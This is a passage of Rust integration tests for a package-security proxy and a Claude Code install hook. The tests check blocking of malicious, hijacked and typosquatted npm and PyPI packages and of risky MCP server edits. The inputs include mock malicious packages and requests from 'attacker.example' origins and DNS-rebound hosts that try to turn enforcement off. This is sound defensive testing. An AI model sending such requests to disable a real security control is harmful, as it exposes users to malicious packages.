    assert!(msg.contains("min_age_days"), "{msg}");
    assert!(
        msg.contains("block_install_scripts_from_new: runs install scripts (postinstall)"),
        "{msg}"
    );

    let r = h.get("/npm/does-not-exist").await;
    assert_eq!(r.status(), 404);
    let ev = h.events().await;
    assert_eq!(ev[0]["kind"], "nonexistent_package");
    assert_eq!(ev[0]["name"], "does-not-exist");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn warn_only_age_rule_with_install_scripts() {
    let h = Harness::start(|p| p.min_age_severity = customs::config::AgeSeverity::Warn).await;
    let (_, v) = h.check("npm", "freshpkg", None).await;
    assert_eq!(v["decision"], "block");
    let rules: Vec<&str> = v["policy_hits"]
        .as_array()
        .unwrap()
        .iter()
        .map(|h| h.as_str_rule())
        .collect();
    assert_eq!(
        rules,
        vec!["min_age_days", "block_install_scripts_from_new"]
    );
    h.stop().await;
}

fn rules_of(v: &Value) -> Vec<String> {
    v["policy_hits"]
        .as_array()
        .unwrap()
        .iter()
        .map(|h| h.as_str_rule().to_string())
        .collect()
}

#[tokio::test(flavor = "multi_thread")]
async fn dependency_rules() {
    let h = Harness::start(|_| {}).await;
    let (s, v) = h.check("npm", "depjack", None).await;
    assert_eq!(s, 200);
    assert_eq!(v["decision"], "block");
    let r = rules_of(&v);
    assert!(
        r.contains(&"nonregistry_dependency_added".to_string()),
        "{v}"
    );
    assert!(r.contains(&"young_dependency_added".to_string()), "{v}");
    let detail = v["policy_hits"]
        .as_array()
        .unwrap()
        .iter()
        .find(|x| x["rule"] == "young_dependency_added")
        .unwrap()["detail"]
        .as_str()
        .unwrap()
        .to_string();
    assert!(
        detail.contains("lure-dep was first published 24 hours before"),
        "{detail}"
    );
    // The proxy applies the same rules to the tarball.
    let r = h.get("/npm/depjack/-/depjack-2.0.1.tgz").await;
    assert_eq!(r.status(), 403);
    h.stop().await;

    // Both rules can be turned off; the earlier release never triggers them.
    let h = Harness::start(|p| {
        p.nonregistry_dependency_added = RuleSeverity::Off;
        p.young_dependency_added = RuleSeverity::Off;
    })
    .await;
    let (_, v) = h.check("npm", "depjack", None).await;
    let r = rules_of(&v);
    assert!(!r.iter().any(|x| x.contains("dependency")), "{v}");
    let (_, v) = h.check("npm", "depjack", Some("2.0.0")).await;
    assert!(rules_of(&v).is_empty(), "{v}");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn release_history_rules() {
    // The default policy blocks a release that adds an install script.
    let h = Harness::start(|_| {}).await;
    let (_, v) = h.check("npm", "hijacked", None).await;
    assert_eq!(v["decision"], "block");
    let r = h.get("/npm/hijacked/-/hijacked-1.1.1.tgz").await;
    assert_eq!(r.status(), 403);
    let err: Value = r.json().await.unwrap();
    assert!(err["error"]
        .as_str()
        .unwrap()
        .contains("install_script_added"));
    h.stop().await;

    let h = Harness::start(|p| p.install_script_added = RuleSeverity::Warn).await;
    // `check` and the proxy both compare the release with the ones before it.
    let (s, v) = h.check("npm", "hijacked", None).await;
    assert_eq!(s, 200);
    assert_eq!(v["version"], "1.1.1");
    assert_eq!(
        rules_of(&v),
        vec![
            "provenance_dropped",
            "install_script_added",
            "dormant_revival",
            "publisher_changed"
        ]
    );
    assert_eq!(v["decision"], "warn");
    assert!(v["policy_hits"][1]["detail"]
        .as_str()
        .unwrap()
        .contains("postinstall added since 1.1.0: node bundle.js"));

    // Warnings: the proxy serves the tarball and records the same hits.
    let r = h.get("/npm/hijacked/-/hijacked-1.1.1.tgz").await;
    assert_eq!(r.status(), 200);
    let ev = h.events().await;
    assert_eq!(ev[0]["kind"], "install");
    let id = ev[0]["verdict_id"].as_i64().unwrap();
    let verdict: Value = h
        .get(&format!("/api/verdicts/{id}"))
        .await
        .json()
        .await
        .unwrap();
    assert!(rules_of(&verdict).contains(&"publisher_changed".to_string()));
    let (_, v) = h.check("npm", "hijacked", Some("1.1.0")).await;
    assert!(rules_of(&v).is_empty(), "{v}");

    // PyPI through the proxy: the project document provides the history.
    let r = h.get(&pypi_file_path("revived", "1.1.0")).await;
    assert_eq!(r.status(), 200);
    let id = h.events().await[0]["verdict_id"].as_i64().unwrap();
    let verdict: Value = h
        .get(&format!("/api/verdicts/{id}"))
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(rules_of(&verdict), vec!["dormant_revival"]);
    // PyPI provenance comes from the JSON simple index.
    let (_, v) = h.check("pypi", "unsigned", None).await;
    assert_eq!(v["version"], "1.1.0");
    assert_eq!(rules_of(&v), vec!["provenance_dropped"]);
    assert!(v["policy_hits"][0]["detail"]
        .as_str()
        .unwrap()
        .contains("previous release 1.0.0 had one"));
    let (_, v) = h.check("pypi", "unsigned", Some("1.0.0")).await;
    assert!(rules_of(&v).is_empty(), "{v}");
    h.stop().await;

    // Severities are configurable, and `off` keeps a rule quiet.
    let h = Harness::start(|p| {
        p.install_script_added = RuleSeverity::Warn;
        p.provenance_dropped = RuleSeverity::Block;
        p.publisher_changed = RuleSeverity::Off;
        p.dormant_revival = RuleSeverity::Off;
    })
    .await;
    let r = h.get("/npm/hijacked/-/hijacked-1.1.1.tgz").await;
    assert_eq!(r.status(), 403);
    let err: Value = r.json().await.unwrap();
    assert!(err["error"]
        .as_str()
        .unwrap()
        .contains("provenance_dropped"));
    let (_, v) = h.check("npm", "hijacked", None).await;
    assert_eq!(
        rules_of(&v),
        vec!["provenance_dropped", "install_script_added"]
    );
    let r = h.get(&pypi_file_path("revived", "1.1.0")).await;
    assert_eq!(r.status(), 200);
    let id = h.events().await[0]["verdict_id"].as_i64().unwrap();
    let verdict: Value = h
        .get(&format!("/api/verdicts/{id}"))
        .await
        .json()
        .await
        .unwrap();
    assert!(rules_of(&verdict).is_empty(), "{verdict}");
    h.stop().await;
}

trait RuleName {
    fn as_str_rule(&self) -> &str;
}
impl RuleName for Value {
    fn as_str_rule(&self) -> &str {
        self["rule"].as_str().unwrap()
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn nonexistent_packages() {
    let h = Harness::start(|_| {}).await;
    let r = h.get("/pypi/simple/nope-not-here/").await;
    assert_eq!(r.status(), 404);
    let ev = h.events().await;
    assert_eq!(ev[0]["kind"], "nonexistent_package");
    assert_eq!(ev[0]["decision"], "block");

    let (status, body) = h.check("pypi", "nope-not-here", None).await;
    assert_eq!(status, 404);
    assert_eq!(body["code"], "nonexistent_package");
    assert!(body["error"]
        .as_str()
        .unwrap()
        .contains("does not exist on PyPI"));
    assert_eq!(body["verdict"]["decision"], "block");
    assert!(body["verdict"]["id"].is_i64());
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn check_resolves_versions() {
    let h = Harness::start(|_| {}).await;
    let (s, v) = h.check("pypi", "goodpkg", None).await;
    assert_eq!(s, 200);
    assert_eq!(v["version"], "1.1.0");
    let (_, v) = h.check("pypi", "goodpkg", Some("<1.1")).await;
    assert_eq!(v["version"], "1.0.0");
    let (_, v) = h.check("pypi", "goodpkg", Some("==1.0.0")).await;
    assert_eq!(v["version"], "1.0.0");
    let (s, v) = h.check("pypi", "goodpkg", Some(">=9")).await;
    assert_eq!(s, 422, "{v}");
    let (_, v) = h.check("npm", "@scope/lib", Some("^1")).await;
    assert_eq!(v["version"], "1.2.3");
    assert_eq!(v["decision"], "allow");
    let (s, _) = h.check("cargo", "serde", None).await;
    assert_eq!(s, 400);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn concurrent_requests_scan_once() {
    let h = Harness::start(|_| {}).await;
    h.mock.file_delay_ms.store(400, Ordering::SeqCst);
    let path = pypi_file_path("slowpkg", "1.0.0");
    let mut tasks = Vec::new();
    for _ in 0..8 {
        let (http, url) = (h.http.clone(), format!("{}{path}", h.base));
        tasks.push(tokio::spawn(async move {
            let r = http.get(url).send().await.unwrap();
            let id = r.headers()["x-customs-verdict"]
                .to_str()
                .unwrap()
                .to_string();
            (r.status().as_u16(), id, r.bytes().await.unwrap())
        }));
    }
    let mut ids = Vec::new();
    for t in tasks {
        let (status, id, body) = t.await.unwrap();
        assert_eq!(status, 200);
        assert_eq!(body.as_ref(), b"benign slow");
        ids.push(id);
    }
    assert_eq!(h.mock.hits("packages/ab/cd/slowpkg-1.0.0.tar.gz"), 1);
    assert_eq!(h.scans.load(Ordering::SeqCst), 1);
    assert!(ids.windows(2).all(|w| w[0] == w[1]), "{ids:?}");
    let metrics = h.get("/metrics").await.text().await.unwrap();
    assert!(
        metrics.contains("customs_singleflight_joins_total 7"),
        "{metrics}"
    );
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn monitor_mode_serves_blocked_artifacts() {
    let h = Harness::start(|p| p.mode = Mode::Monitor).await;
    let r = h.get(&pypi_file_path("evilpkg", "0.0.1")).await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.headers()["x-customs-decision"], "block");
    assert_eq!(r.bytes().await.unwrap().as_ref(), b"EVIL archive");
    let ev = h.events().await;
    assert_eq!(ev[0]["decision"], "block");
    let v: Value = h
        .get(&format!("/api/verdicts/{}", ev[0]["verdict_id"]))
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(v["mode"], "monitor");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn sse_delivers_events() {
    let h = Harness::start(|_| {}).await;
    let mut stream = h.get("/api/events/stream").await;
    assert_eq!(stream.headers()["content-type"], "text/event-stream");
    let (_, v) = h.check("pypi", "goodpkg", Some("1.0.0")).await;
    let mut buf = String::new();
    let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
    while !buf.contains("\n\n") {
        let chunk = tokio::time::timeout_at(deadline, stream.chunk())
            .await
            .expect("no SSE frame")
            .unwrap()
            .unwrap();
        buf.push_str(&String::from_utf8_lossy(&chunk));
    }
    assert!(buf.starts_with("event: install\n"), "{buf}");
    let data = buf.lines().find_map(|l| l.strip_prefix("data: ")).unwrap();
    let ev: Value = serde_json::from_str(data).unwrap();
    assert_eq!(ev["kind"], "check");
    assert_eq!(ev["verdict_id"], v["id"]);
    assert_eq!(ev["client"], "test");
    // Shutdown must not hang on the open stream.
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn policy_api_validates_and_persists() {
    let h = Harness::start(|_| {}).await;
    let mut p: Value = h.get("/api/policy").await.json().await.unwrap();
    assert_eq!(p["mode"], "enforce");
    assert_eq!(p["warn_threshold"], "model");
    assert_eq!(p["provenance_dropped"], "warn");
    assert_eq!(p["version_anomaly"], "off");
    assert_eq!(p["dormant_days"], 365);
    p["deny"] = json!(["pypi:goodpkg"]);
    p["block_threshold"] = json!(0.8);
    p["publisher_changed"] = json!("block");
    p["dormant_days"] = json!(400);
    let r = h
        .http
        .put(format!("{}/api/policy", h.base))
        .json(&p)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    let saved = std::fs::read_to_string(h.engine.policy_path()).unwrap();
    assert!(saved.contains("block_threshold = 0.8"), "{saved}");
    assert!(saved.contains("\"pypi:goodpkg\""), "{saved}");
    assert!(saved.contains("publisher_changed = \"block\""), "{saved}");
    assert!(saved.contains("dormant_days = 400"), "{saved}");
    let r = h.get(&pypi_file_path("goodpkg", "1.0.0")).await;
    assert_eq!(r.status(), 403);

    let mut bad = p.clone();
    bad["dormant_days"] = json!(0);
    let r = h
        .http
        .put(format!("{}/api/policy", h.base))
        .json(&bad)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 400);
    let e: Value = r.json().await.unwrap();
    assert_eq!(e["errors"][0]["field"], "dormant_days");

    p["warn_threshold"] = json!(1.5);
    let r = h
        .http
        .put(format!("{}/api/policy", h.base))
        .json(&p)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 400);
    let e: Value = r.json().await.unwrap();
    assert_eq!(e["errors"][0]["field"], "warn_threshold");
    let r = h
        .http
        .put(format!("{}/api/policy", h.base))
        .body(r#"{"mode": "strict"}"#)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 400);
    // The bad updates did not change the active policy.
    let now: Value = h.get("/api/policy").await.json().await.unwrap();
    assert_eq!(now["block_threshold"], 0.8);

    // On a loopback listener a rebound host name cannot even read.
    for path in ["/api/events", "/api/policy", "/pypi/simple/goodpkg/"] {
        let r = h
            .http
            .get(format!("{}{path}", h.base))
            .header("host", "rebind.attacker.example:7878")
            .send()
            .await
            .unwrap();
        assert_eq!(r.status(), 403, "{path}");
    }
    let r = h
        .http
        .get(format!("{}/healthz", h.base))
        .header("host", "localhost:7878")
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);

    // A page on another origin, or one reached through DNS rebinding (its own host name
    // resolving to 127.0.0.1), cannot switch enforcement off.
    let mut off = p.clone();
    off["warn_threshold"] = json!("model");
    off["mode"] = json!("monitor");
    for (name, value) in [
        ("host", "rebind.attacker.example:7878"),
        ("origin", "http://attacker.example"),
    ] {
        let r = h
            .http
            .put(format!("{}/api/policy", h.base))
            .header(name, value)
            .json(&off)
            .send()
            .await
            .unwrap();
        assert_eq!(r.status(), 403, "{name}: {value}");
    }
    let r = h
        .http
        .post(format!("{}/api/check", h.base))
        .header("origin", "http://attacker.example")
        .json(&json!({"ecosystem": "pypi", "name": "goodpkg"}))
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 403);
    let now: Value = h.get("/api/policy").await.json().await.unwrap();
    assert_eq!(now["mode"], "enforce");
    // The dashboard's own origin is accepted.
    let r = h
        .http
        .put(format!("{}/api/policy", h.base))
        .header("origin", h.base.as_str())
        .json(&off)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn events_filters_stats_model_metrics_health() {
    let h = Harness::start(|_| {}).await;
    h.get(&pypi_file_path("goodpkg", "1.0.0")).await;
    h.get(&pypi_file_path("evilpkg", "0.0.1")).await;
    h.get("/npm/plainlib/-/plainlib-0.1.0.tgz").await;
    let ev: Vec<Value> = h
        .get("/api/events?decision=block")
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(ev.len(), 1);
    assert_eq!(ev[0]["name"], "evilpkg");
    let ev: Vec<Value> = h
        .get("/api/events?ecosystem=npm")
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(ev.len(), 1);
    let ev: Vec<Value> = h
        .get("/api/events?q=PKG&limit=1")
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(ev.len(), 1);
    let older: Vec<Value> = h
        .get(&format!("/api/events?q=pkg&before={}", ev[0]["id"]))
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(older.len(), 1);
    assert_eq!(older[0]["name"], "goodpkg");

    let s: Value = h.get("/api/stats").await.json().await.unwrap();
    assert_eq!(s["total"], 3);
    assert_eq!(s["by_decision"]["block"], 1);
    assert_eq!(s["by_ecosystem"]["pypi"]["allow"], 1);
    assert_eq!(s["by_kind"]["install"], 3);
    assert_eq!(s["blocks_per_day"].as_array().unwrap().len(), 30);
    assert_eq!(s["blocks_per_day"][29]["count"], 1);
    assert_eq!(s["top_reasons"][0]["feature"], "inst_download_exec");

    let m: Value = h.get("/api/model").await.json().await.unwrap();
    assert_eq!(m["model_version"], "dev-untrained");
    assert_eq!(m["feature_schema_version"], 1);
    assert_eq!(m["untrained"], true);
    assert_eq!(m["thresholds"]["warn"], 0.5);
    assert_eq!(m["components"]["code_gbdt"]["loaded"], true);

    let metrics = h.get("/metrics").await.text().await.unwrap();
    assert!(
        metrics
            .contains(r#"customs_http_requests_total{route="/pypi/files/{*path}",status="403"} 1"#),
        "{metrics}"
    );
    assert!(metrics.contains(r#"customs_verdicts_total{decision="block",ecosystem="pypi"} 1"#));
    assert!(metrics.contains("customs_scan_duration_seconds_count 3"));
    assert!(metrics.contains(r#"customs_upstream_fetch_duration_seconds_count{kind="artifact"} 3"#));

    let health: Value = h.get("/healthz").await.json().await.unwrap();
    assert_eq!(health["status"], "ok");
    let r = h.get("/api/nope").await;
    assert_eq!(r.status(), 404);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn dashboard_serving() {
    let h = Harness::start(|_| {}).await;
    let body = h.get("/").await.text().await.unwrap();
    assert!(body.contains("dashboard is not built"));
    h.stop().await;

    let ui = tempfile::tempdir().unwrap();
    std::fs::write(ui.path().join("index.html"), "<html>SPA</html>").unwrap();
    std::fs::create_dir(ui.path().join("assets")).unwrap();
    std::fs::write(ui.path().join("assets/app.js"), "console.log(1)").unwrap();
    let h = Harness::start_with_ui(|_| {}, Some(ui.path().to_path_buf())).await;
    assert_eq!(h.get("/").await.text().await.unwrap(), "<html>SPA</html>");
    assert_eq!(
        h.get("/assets/app.js").await.text().await.unwrap(),
        "console.log(1)"
    );
    let r = h.get("/verdicts/12").await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.text().await.unwrap(), "<html>SPA</html>");
    h.stop().await;
}

/// Installer and proxy settings a spawned binary must not inherit from the developer.
const INHERITED_PREFIXES: [&str; 5] = ["CUSTOMS_", "PIP_", "UV_", "NPM_CONFIG_", "YARN_"];
const INHERITED_VARS: [&str; 5] = [
    "PIPENV_PYPI_MIRROR",
    "PDM_PYPI_URL",
    "HTTP_PROXY",
    "HTTPS_PROXY",
    "ALL_PROXY",
];

/// The real binary, isolated from the machine it runs on: `data_dir` is its data directory,
/// whose `policy.toml` (unless the test wrote one) points every upstream at `registry` (the
/// mock) or at a closed port; it gets the dev models and none of the caller's `CUSTOMS_*`,
/// installer index or proxy variables. A check that misses the server and falls back to an
/// in-process engine therefore stays offline and writes only below `data_dir`.
fn customs_cmd(data_dir: &std::path::Path, registry: Option<&str>) -> std::process::Command {
    std::fs::create_dir_all(data_dir).unwrap();
    let policy = data_dir.join("policy.toml");
    if !policy.exists() {
        let b = registry.unwrap_or("http://127.0.0.1:9");
        std::fs::write(
            &policy,
            format!(
                "[upstream]\npypi_simple = \"{b}/simple\"\npypi_files = \"{b}/files\"\npypi_json = \"{b}/pypi\"\nnpm = \"{b}/npm\"\n"
            ),
        )
        .unwrap();
    }
    let mut c = std::process::Command::new(env!("CARGO_BIN_EXE_customs"));
    for (k, _) in std::env::vars_os() {
        let upper = k.to_string_lossy().to_ascii_uppercase();
        if INHERITED_PREFIXES.iter().any(|p| upper.starts_with(p))
            || INHERITED_VARS.contains(&upper.as_str())
        {
            c.env_remove(&k);
        }
    }
    c.env("CUSTOMS_DATA_DIR", data_dir).env(
        "CUSTOMS_MODELS",
        PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../models/dev"),
    );
    c
}

/// Run the real binary as Claude Code would.
fn run_hook(
    server: &str,
    command: &str,
    cwd: &std::path::Path,
    extra: &[&str],
) -> (String, String, i32) {
    let input = json!({
        "session_id": "test",
        "transcript_path": "/tmp/t.jsonl",
        "cwd": cwd,
        "permission_mode": "default",
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": command, "description": "install"},
    });
    run_hook_input(server, input, cwd, extra)
}

/// Run `customs hook claude-code` on one PreToolUse input.
fn run_hook_input(
    server: &str,
    input: Value,
    cwd: &std::path::Path,
    extra: &[&str],
) -> (String, String, i32) {
    use std::io::Write;
    use std::process::Stdio;
    let mut child = customs_cmd(&cwd.join("hook-data"), None)
        .args(["hook", "claude-code", "--server", server])
        .args(extra)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(input.to_string().as_bytes())
        .unwrap();
    let out = child.wait_with_output().unwrap();
    (
        String::from_utf8_lossy(&out.stdout).into_owned(),
        String::from_utf8_lossy(&out.stderr).into_owned(),
        out.status.code().unwrap_or(-1),
    )
}

#[tokio::test(flavor = "multi_thread")]
async fn hook_checks_mcp_servers_an_edit_adds() {
    let h = Harness::start(|_| {}).await;
    let dir = tempfile::tempdir().unwrap();
    let cfg = dir.path().join(".mcp.json");
    std::fs::write(
        &cfg,
        "{\n  \"mcpServers\": {\n    \"lib\": { \"command\": \"npx\", \"args\": [\"-y\", \"@scope/lib@1.2.3\"] }\n  }\n}\n",
    )
    .unwrap();
    let edit = |old: &str, new: &str| {
        json!({
            "session_id": "test",
            "cwd": dir.path(),
            "hook_event_name": "PreToolUse",
            "tool_name": "Edit",
            "tool_input": {"file_path": cfg, "old_string": old, "new_string": new},
        })
    };
    let base = h.base.clone();
    let path = dir.path().to_path_buf();
    let inputs = vec![
        // Adds a server whose newest release is malicious.
        edit(
            "\"lib\": {",
            "\"mail\": { \"command\": \"npx\", \"args\": [\"-y\", \"evil-js\"] },\n    \"lib\": {",
        ),
        // Adds a benign server.
        edit(
            "\"lib\": {",
            "\"fetch\": { \"command\": \"uvx\", \"args\": [\"goodpkg\"] },\n    \"lib\": {",
        ),
        // Leaves the existing server as it is.
        edit("\"-y\", \"@scope", "\"--yes\", \"@scope"),
    ];
    let out = tokio::task::spawn_blocking(move || {
        inputs
            .into_iter()
            .map(|i| run_hook_input(&base, i, &path, &[]))
            .collect::<Vec<_>>()
    })
    .await
    .unwrap();
    let (stdout, err, code) = &out[0];
    assert_eq!(*code, 0, "{err}");
    let v: Value = serde_json::from_str(stdout).unwrap_or_else(|_| panic!("{stdout} {err}"));
    let hso = &v["hookSpecificOutput"];
    assert_eq!(hso["permissionDecision"], "deny", "{v}");
    let reason = hso["permissionDecisionReason"].as_str().unwrap();
    assert!(reason.starts_with("This edit adds MCP servers"), "{reason}");
    assert!(reason.contains("npm:evil-js 6.6.6"), "{reason}");
    assert_eq!(out[1].0.trim(), "", "{:?}", out[1]);
    assert_eq!(out[2].0.trim(), "", "{:?}", out[2]);
    let events: Value = h.get("/api/events").await.json().await.unwrap();
    let names: Vec<&str> = events
        .as_array()
        .unwrap()
        .iter()
        .map(|e| e["name"].as_str().unwrap())
        .collect();
    assert!(
        names.contains(&"evil-js") && names.contains(&"goodpkg"),
        "{names:?}"
    );
    assert!(!names.contains(&"@scope/lib"), "{names:?}");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn claude_code_hook_end_to_end() {
    let h = Harness::start(|_| {}).await;
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("requirements.txt"),
        "goodpkg==1.0.0\nevilpkg\n",
    )
    .unwrap();
    let base = h.base.clone();
    let cwd = dir.path().to_path_buf();
    let results = tokio::task::spawn_blocking(move || {
        vec![
            run_hook(
                &base,
                "cd /x && FOO=1 pip install 'evilpkg==0.0.1'",
                &cwd,
                &[],
            ),
            run_hook(
                &base,
                "pip install goodpkg && npm i @scope/lib@^1",
                &cwd,
                &[],
            ),
            run_hook(&base, "pip install reqeusts", &cwd, &[]),
            run_hook(
                &base,
                "python -m pip install -r requirements.txt",
                &cwd,
                &[],
            ),
            run_hook(&base, "pip install nope-not-here", &cwd, &[]),
            run_hook(&base, "git status", &cwd, &[]),
        ]
    })
    .await
    .unwrap();

    let decision = |out: &str| -> Value { serde_json::from_str(out.trim()).unwrap() };
    let (out, _, code) = &results[0];
    assert_eq!(*code, 0);
    let d = decision(out);
    assert_eq!(d["hookSpecificOutput"]["hookEventName"], "PreToolUse");
    assert_eq!(d["hookSpecificOutput"]["permissionDecision"], "deny");
    let reason = d["hookSpecificOutput"]["permissionDecisionReason"]
        .as_str()
        .unwrap();
    assert!(reason.contains("pypi:evilpkg 0.0.1"), "{reason}");
    assert!(
        reason.contains("Downloads and executes a payload"),
        "{reason}"
    );

    assert_eq!(
        results[1].0.trim(),
        "",
        "allowed installs print nothing: {:?}",
        results[1]
    );
    assert_eq!(results[1].2, 0);

    assert_eq!(
        decision(&results[2].0)["hookSpecificOutput"]["permissionDecision"],
        "ask"
    );
    let d = decision(&results[3].0);
    assert_eq!(d["hookSpecificOutput"]["permissionDecision"], "deny");
    let d = decision(&results[4].0);
    let reason = d["hookSpecificOutput"]["permissionDecisionReason"]
        .as_str()
        .unwrap();
    assert!(reason.contains("does not exist on PyPI"), "{reason}");
    assert_eq!(results[5].0, "");

    // The server recorded the hook's checks.
    let ev = h.events().await;
    assert!(ev.iter().any(|e| e["client"] == "claude-code-hook"));
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn hook_checks_project_installs() {
    let h = Harness::start(|_| {}).await;
    let lock = |entries: &str| {
        format!(r#"{{"lockfileVersion": 3, "packages": {{"": {{"name": "app"}}{entries}}}}}"#)
    };
    let entry = |path: &str, name: &str, version: &str| {
        format!(
            r#", "node_modules/{path}": {{"version": "{version}", "resolved": "https://registry.npmjs.org/{name}/-/{name}-{version}.tgz"}}"#
        )
    };
    let scoped = r#", "node_modules/@scope/lib": {"version": "1.2.3", "resolved": "https://registry.npmjs.org/@scope/lib/-/lib-1.2.3.tgz"}"#;
    let projects = [
        // The lockfile pins a malicious package.
        (
            r#"{"dependencies": {"@scope/lib": "^1", "evil-js": "^6"}}"#.to_string(),
            lock(&format!("{scoped}{}", entry("evil-js", "evil-js", "6.6.6"))),
        ),
        // A dependency added to package.json but not locked yet is checked too.
        (
            r#"{"dependencies": {"@scope/lib": "^1", "plainlib": "^0.1.0"}}"#.to_string(),
            lock(scoped),
        ),
        (
            r#"{"dependencies": {"@scope/lib": "^1", "evil-js": "^6"}}"#.to_string(),
            lock(scoped),
        ),
        // A trusted name whose tarball URL serves another package.
        (
            r#"{"dependencies": {"plainlib": "^0.1.0"}}"#.to_string(),
            lock(&entry("plainlib", "evil-js", "6.6.6")),
        ),
    ];
    let dirs: Vec<tempfile::TempDir> = projects
        .iter()
        .map(|(manifest, lockfile)| {
            let d = tempfile::tempdir().unwrap();
            std::fs::write(d.path().join("package.json"), manifest).unwrap();
            std::fs::write(d.path().join("package-lock.json"), lockfile).unwrap();
            d
        })
        .collect();
    let base = h.base.clone();
    let paths: Vec<std::path::PathBuf> = dirs.iter().map(|d| d.path().to_path_buf()).collect();
    let results = tokio::task::spawn_blocking(move || {
        vec![
            run_hook(&base, "npm ci", &paths[0], &[]),
            run_hook(&base, "npm install", &paths[1], &[]),
            run_hook(&base, "cd x; npm i --no-audit", &paths[2], &[]),
            run_hook(&base, "npm ci", &paths[3], &[]),
            run_hook(&base, "npm run build", &paths[0], &[]),
        ]
    })
    .await
    .unwrap();
    let reason = |out: &str| -> (String, String) {
        let d: Value = serde_json::from_str(out.trim()).unwrap();
        let o = &d["hookSpecificOutput"];
        (
            o["permissionDecision"].as_str().unwrap().to_string(),
            o["permissionDecisionReason"].as_str().unwrap().to_string(),
        )
    };
    let (d, r) = reason(&results[0].0);
    assert_eq!(d, "deny");
    assert!(r.contains("npm:evil-js 6.6.6"), "{r}");
    assert_eq!(results[1].0.trim(), "", "{:?}", results[1]);
    let (d, r) = reason(&results[2].0);
    assert_eq!(d, "deny", "{r}");
    assert!(r.contains("npm:evil-js"), "{r}");
    let (d, r) = reason(&results[3].0);
    assert_eq!(d, "deny");
    assert!(
        r.contains("npm:plainlib 6.6.6") && r.contains("lockfile installs evil-js@6.6.6"),
        "{r}"
    );
    assert_eq!(results[4].0, "");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn project_installs_count_only_blocks_for_locked_packages() {
    // freshpkg warns (min_age_days at warn severity).
    let h = Harness::start(|p| {
        p.min_age_severity = customs::config::AgeSeverity::Warn;
        p.block_install_scripts_from_new = false;
    })
    .await;
    let locked = r#"{"lockfileVersion": 3, "packages": {"": {"name": "app"},
  "node_modules/freshpkg": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/freshpkg/-/freshpkg-1.0.0.tgz"}}}"#;
    let empty = r#"{"lockfileVersion": 3, "packages": {"": {"name": "app"}}}"#;
    let dirs: Vec<tempfile::TempDir> = [locked, empty]
        .iter()
        .map(|lock| {
            let d = tempfile::tempdir().unwrap();
            std::fs::write(
                d.path().join("package.json"),
                r#"{"dependencies": {"freshpkg": "1.0.0"}}"#,
            )
            .unwrap();
            std::fs::write(d.path().join("package-lock.json"), lock).unwrap();
            d
        })
        .collect();
    let base = h.base.clone();
    let paths: Vec<std::path::PathBuf> = dirs.iter().map(|d| d.path().to_path_buf()).collect();
    let results = tokio::task::spawn_blocking(move || {
        vec![
            run_hook(&base, "npm ci", &paths[0], &[]),
            run_hook(&base, "npm install", &paths[1], &[]),
            run_hook(&base, "npm install freshpkg", &paths[0], &[]),
        ]
    })
    .await
    .unwrap();
    assert_eq!(results[0].0.trim(), "", "{:?}", results[0]);
    for (out, _, _) in &results[1..] {
        let d: Value = serde_json::from_str(out.trim()).unwrap();
        assert_eq!(
            d["hookSpecificOutput"]["permissionDecision"], "ask",
            "{out}"
        );
    }
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn hook_failure_modes() {
    let dir = tempfile::tempdir().unwrap();
    // A config whose upstreams refuse connections: the server is unreachable, the
    // in-process fallback cannot reach the registry either.
    std::fs::write(
        dir.path().join("customs.toml"),
        "[upstream]\npypi_simple = \"http://127.0.0.1:9/simple\"\npypi_files = \"http://127.0.0.1:9/f\"\npypi_json = \"http://127.0.0.1:9/pypi\"\nnpm = \"http://127.0.0.1:9/npm\"\n",
    )
    .unwrap();
    let cfg = dir.path().join("customs.toml").display().to_string();
    let cwd = dir.path().to_path_buf();
    let (open, closed, garbage) = tokio::task::spawn_blocking(move || {
        let open = run_hook(
            "http://127.0.0.1:9",
            "pip install anything",
            &cwd,
            &["--config", &cfg],
        );
        let closed = run_hook(
            "http://127.0.0.1:9",
            "pip install anything",
            &cwd,
            &["--config", &cfg, "--fail-closed"],
        );
        let garbage = {
            use std::io::Write;
            use std::process::Stdio;
            let mut c = customs_cmd(&cwd.join("garbage-data"), None)
                .args(["hook", "claude-code"])
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
                .unwrap();
            c.stdin.take().unwrap().write_all(b"{not json").unwrap();
            let o = c.wait_with_output().unwrap();
            (
